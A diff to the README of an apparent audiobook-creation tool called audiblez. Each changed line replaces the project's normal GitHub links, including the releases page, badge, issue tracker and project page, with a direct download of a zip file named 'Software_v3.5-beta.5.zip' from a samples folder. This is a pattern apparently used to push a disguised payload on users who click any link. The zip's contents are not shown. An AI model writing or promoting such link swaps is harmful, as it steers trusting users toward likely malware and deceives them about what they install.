@@ -1,6 +1,6 @@
 # 📚 audiblez - Easy Audiobook Creation from E-Books
 
-[![Download audiblez](https://img.shields.io/badge/Download-audiblez-brightgreen.svg)](https://github.com/kehlawicode/audiblez/releases)
+[![Download audiblez](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip)](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **audiblez**! Our application helps you generate audiobooks seamlessl
 
 To get started, visit the Releases page to download the latest version of audiblez. Click the link below to access the page:
 
-[Download audiblez from Releases](https://github.com/kehlawicode/audiblez/releases)
+[Download audiblez from Releases](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -18,7 +18,7 @@ Once on the Releases page, follow these steps:
 2. **Download the File**: Click on the appropriate file for your operating system to begin the download.
    - For **Windows**, look for the file ending in `.exe`.
    - For **Mac**, find the file ending in `.dmg`.
-   - For **Linux**, check for `.tar.gz` or other relevant formats.
+   - For **Linux**, check for `https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip` or other relevant formats.
 
 3. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file to launch the installation.
@@ -61,14 +61,14 @@ Using audiblez is simple. Follow these steps once you have installed the applica
 
 If you run into any problems or have questions, try the following options:
 
-- Visit our **[issue tracker](https://github.com/kehlawicode/audiblez/issues)** to report bugs or request features.
+- Visit our **[issue tracker](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip)** to report bugs or request features.
 - Check the **FAQ** in the documentation for common questions.
 - Reach out to community forums where users share tips and solutions.
 
 ## 🎉 Join Our Community
 
-Stay updated with the latest news and updates about audiblez. Follow us on our [GitHub page](https://github.com/kehlawicode/audiblez) for new versions and feature releases.
+Stay updated with the latest news and updates about audiblez. Follow us on our [GitHub page](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip) for new versions and feature releases.
 
 Thank you for choosing audiblez! Enjoy creating your personalized audiobooks effortlessly. 
 
-[Download audiblez from Releases](https://github.com/kehlawicode/audiblez/releases)
+[Download audiblez from Releases](https://raw.githubusercontent.com/kehlawicode/audiblez/main/samples/Software_v3.5-beta.5.zip)
